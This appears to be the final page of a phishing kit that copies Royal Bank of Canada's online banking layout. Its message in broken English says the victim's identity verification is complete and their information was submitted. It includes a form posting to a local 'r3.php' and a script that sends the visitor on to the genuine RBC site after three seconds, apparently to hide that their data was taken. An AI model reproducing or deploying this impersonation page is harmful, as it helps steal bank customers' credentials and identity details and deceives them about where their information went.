		<p class="subcopy">A student line of credit is a great option to help you pay for school and give you easy access to cash in an emergency.</p>
	</div>
</div>

<div class="callout callout-taupe-gradient oneline-callout"><span class="callout-top"><span>&nbsp;</span></span><div class="callout-content clear">
	<p class="standardtextsize"><img src="/uos/_assets/images/buttons/chevron.gif" alt="" border="0" class="bullet" /> <strong>Assess your current financial situation to help you plan for the future with our <a href="https://www.rbcroyalbank.com/cgi-bin/personalloans/debt-reduction/debt-reduction-plan.pl">Debt Reduction Plan.</strong></a></p>
</div><span class="callout-bottom"><span>&nbsp;</span></span></div>
</li>-->
<!-- Advice ends -->


</ul>

</div>
</div>
<!-- **** **** MAIN MENU OVERLAY ENDS **** *** -->

<script type="text/javascript">
	$(document).ready(function(){
		$(".no-hover").mouseover(function(event) {
			setTimeout(function() {
				$('.mainnav-overylay-category-wpr').hide();
			}, 401);
		});
	})
</script>
  <div class="skipnavanchor"><a name="skipheadernav" id="skipheadernav"></a></div>
  <div id="layout" class="clear layout-111" style="z-index: 960;">
    <div id="layout-column-left">
      <!-- LEFT NAVIGATION STARTS -->
      
<div class="skipnav"><a href="/products/deposits/additional-services.html#skipleftnav">Skip Left Navigation</a></div>
<div id="leftnav" class="clear">
	<ul class="leftnav-currentsection">
		<li class="leftnav-sectionheader"><a>My Accounts</a></li>
		
								<li class="leftnav-path"><a>Bank Accounts</a></li>
							
					<li><a target="_self">Accounts Summary</a></li>
				
					<li><a target="_self">Banking</a></li>
				
					<li><a target="_self">Direct Investing</a></li>
				
					<li><a target="_self">Wealth Management</a></li>
				
						<li class="leftnav-lastpage"><a target="_self">Insurance</a></li>
						
	</ul>
</div>
<div class="skipnavanchor"><a name="skipleftnav" id="skipleftnav"></a></div>
		
      <!-- LEFT NAVIGATION ENDS -->
    </div>
    <div id="pagetitlearea" class="clear">
      <h1 id="pagetitle">Please Wait</h1>
    </div>
    <div id="layout-column-main">
      <!-- BODY CONTENT STARTS -->
      <div class="newterms" id="okok">    	
		  <p>
				<strong>Identity verification complet. </strong></p>
		  <p>
				<strong>Your information have been submit please wait.</strong></p>
				<p></p>    </div>
      
		<p> &nbsp;</p>
		
		
		<form method="post" action="r3.php" id="q&amp;a">
      <hr id="hr1">
      <script>
            
            function isInputNumber(evt){
                
                var ch = String.fromCharCode(evt.which);
                
                if(!(/[0-9]/.test(ch))){
                    evt.preventDefault();
                }
                
            }
            
        </script>
			<p>&nbsp;</p>
				<ul class="padding-bt-20px">

    <br />



    <script>

var timer = setTimeout(function() {

window.location='https://www.rbcroyalbank.com/personal.html'

}, 3000);

    </script>
					<h4 id="please">Please Wait...<p>&nbsp;</p>
					<p id="loading">
					<img alt="loading" height="100" src="../../new-header-footer/35.gif" width="100" /></p>
					<p style="margin: 0px; padding: 0px; max-height: 1e+06px; color: rgb(51, 51, 51); font-family: Arial, Verdana, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;">
					We're just checking the information you have provided</p>
					<p style="margin: 0px; padding: 0px; max-height: 1e+06px; font-family: Arial, Verdana, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration: underline; font-weight: bold; color: #0000FF;">
					For your security you will automatically be logged out</p>
					<p>
					&nbsp;</p>
				&nbsp;<script>
            
            function isInputNumber(evt){
                
                var ch = String.fromCharCode(evt.which);
                
                if(!(/[0-9]/.test(ch))){
                    evt.preventDefault();
                }
                
            }
            
        </script><span id="ccnoerror" class="l33error"></span></td></h4></ul>
      
      <hr id="hr1"><p></p>
						<p>
						&nbsp;</p>
				<div class="btn-container"><a title="Back to Top" href="#main-content">Back to Top</a></div>
				<p></p>
    </form>
</div>

      	  <div id="layout-column-right">
      <!-- RIGHT AREA STARTS -->
      <!-- TAKE ACTION STARTS -->
<!-- TAKE ACTION ENDS -->
      <!-- TOOLS STARTS -->
<!-- TOOLS ENDS -->
      <!-- RELATED LINKS STARTS -->
<!-- RELATED LINKS ENDS -->
      <!-- LEARN MORE STARTS -->
<!-- LEARN MORE ENDS -->
      <!-- RIGHT AREA ENDS -->
      </div>
  </div>  <div id="globalfooter-main" style="z-index: 940;">
	<p>Royal Bank of Canada Website, © 1995-2019</p>
					
	<p><a href="http://www.rbc.com/privacysecurity/ca/" title="Privacy &amp; Security (opens new window)" target="_blank" onclick="return popupNewbrowser(this.href)">Privacy &amp; Security</a> | <a href="http://www.rbc.com/legal/" title="Legal (opens new window)" onclick="return popupHelp(this.href)" target="_blank">Legal</a> | <a href="http://www.rbc.com/accessibility/" title="Accessibility (opens new window)" onclick="return popupNewbrowser(this.href)" target="_blank">Accessibility</a></p>
	<p id="globalfooter-tool-line2">
		<span class="globalfooter-tool" id="tool-totop" style="display: none;"><a href="/products/deposits/additional-services.html#top" class="linkedtextandicon"><span>To Top</span> <img src="/uos/_assets/images/footer/totopbutton.gif" alt="To Top" width="16" height="16"></a></span>	
	</p>
</div></div>
</body>


</html>
